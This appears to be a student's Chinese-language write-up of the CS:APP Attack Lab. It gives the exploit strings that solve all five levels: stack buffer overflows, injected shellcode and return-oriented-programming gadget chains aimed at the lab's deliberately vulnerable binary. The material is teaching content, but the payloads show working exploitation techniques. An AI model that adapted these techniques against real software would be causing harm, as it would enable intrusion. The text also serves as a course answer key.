# Attack Lab

- [README](https://csapp.cs.cmu.edu/3e/README-attacklab)
- [ASCII Table](https://www.asciitable.com/)
- [writeup](./attacklab.pdf) 

## Level 1

目标是通过缓冲区溢出的方式令 `getbuf` 函数返回至 `touch1` 函数。

通过 `objdump` 获 `GDB` 可以得到 touch1 函数的首地址为 `0x00000000004017c0`。

根据 `getbuf` 函数的汇编代码可以看出该函数的缓冲区大小为 `0x28`，可以判定只要输入字符串超过 `40(0x28)` bytes 即可实现缓冲区溢出，从而覆盖 `getbuf` 函数的返回地址。

``` asm
0x00000000004017a8 <+0>: sub    $0x28,%rsp
0x00000000004017ac <+4>: mov    %rsp,%rdi
0x00000000004017af <+7>: callq  0x401a40 <Gets>
0x00000000004017b4 <+12>:  mov    $0x1,%eax
0x00000000004017b9 <+17>:  add    $0x28,%rsp
0x00000000004017bd <+21>:  retq
```

可以构造如下题解通过此题目。

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
c0 17 40 00 00 00         /* The address of touch1 */
```

.gdbinit 配置：

``` GDB
b *0x00000000004017b4
run -q < ./input.txt
x/xg 0x5561dca0
x/6xg $rsp
x/xg $rsp+0x28
```

## Level 2

目标是通过缓冲区溢出的方式令 `getbuf` 函数返回至 `touch2` 函数，并且 `touch2` 函数的入参必须是 `0x59b997fa`（cookie.txt）。

根据 Level 1，可如下构造输入令 `getbuf` 函数返回至 `touch2` 函数。

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
ec 17 40 00 00 00
```

通过下面汇编代码将 `touch2` 函数的入参设置为 `0x59b997fa`。

``` asm
0: bf fa 97 b9 59        mov    $0x59b997fa,%edi
5: 48 83 c4 10           add    $0x10,%rsp
9: c3                    retq
```

最终可以构造如下题解通过此题目。

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
a8 dc 61 55 00 00 00 00   /* The address of the following asm code */
bf fa 97 b9 59            /* mov    $0x59b997fa,%edi */ 
48 83 c4 10               /* add    $0x10,%rsp */
c3                        /* ret */ 
00 00 00 00 00 00         /* Padding 0 */
ec 17 40 00 00 00 00 00   /* The address of touch2 */
```

.gdbinit 配置：

```
b *0x00000000004017b9
run -q < ./input.txt
x/10xg $rsp
```

## Level 3

可以构造如下题解通过此题目，关键是让 `touch3` 函数的地址小于 cookie 地址，这样后续函数对栈的操作不会覆盖 cookie。

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
fa 18 40 00 00 00 00 00     /* The address of touch3 */
a8 dc 61 55 00 00 00 00     /* The address of the following asm code */
bf b8 dc 61 55              /* mov    $0x5561dcb8,%edi */ 
48 83 ec 10                 /* sub    $0x10,%rsp */
c3                          /* ret */ 
00 00 00 00 00 00           /* Padding 0 */
35 39 62 39 39 37 66 61     /* cookie */
```

## Level 4

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
cc 19 40 00 00 00 00 00   /* The address of asm code (0x4019cc): popq %rax (58 90 c3) */
fa 97 b9 59 00 00 00 00   /* cookie */
c6 19 40 00 00 00 00 00   /* The address of asm code (0x4019c6): movl %eax,%edi (89 c7 90 c3) */
ec 17 40 00 00 00 00 00   /* The address of touch2 */
```

## Level 5

解决这一关的关键是利用 `lea (%rdi,%rsi,1),%rax (address: 0x4019d6)` 指令构造出 cookie 所在地址。

```
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
61 62 63 64 61 62 63 64
06 1a 40 00 00 00 00 00   /* The address of asm code (0x401a06): movl %rsp,%rax (48 89 e0 c3) */
c5 19 40 00 00 00 00 00   /* The address of asm code (0x4019c5): movl %rax,%rdi (48 89 c7 90 c3) */
cc 19 40 00 00 00 00 00   /* The address of asm code (0x4019cc): popq %rax (58 90 c3) */
48 00 00 00 00 00 00 00   /* The offset of cookie */
42 1a 40 00 00 00 00 00   /* The address of asm code (0x401a42): movl %eax,%edx (89 c2 84 c0 c3) */ 
34 1a 40 00 00 00 00 00   /* The address of asm code (0x401a34): movl %edx,%ecx (89 d1 38 c9 c3) */
13 1a 40 00 00 00 00 00   /* The address of asm code (0x401a13): movl %ecx,%esi (89 ce 90 90 c3) */ 
d6 19 40 00 00 00 00 00   /* The address of asm code (0x4019d6): lea    (%rdi,%rsi,1),%rax (48 8d 04 37) */
c5 19 40 00 00 00 00 00   /* The address of asm code (0x4019c5): movl %rax,%rdi (48 89 c7 90) */
fa 18 40 00 00 00 00 00   /* The address of touch3 */
35 39 62 39 39 37 66 61   /* cookie */
```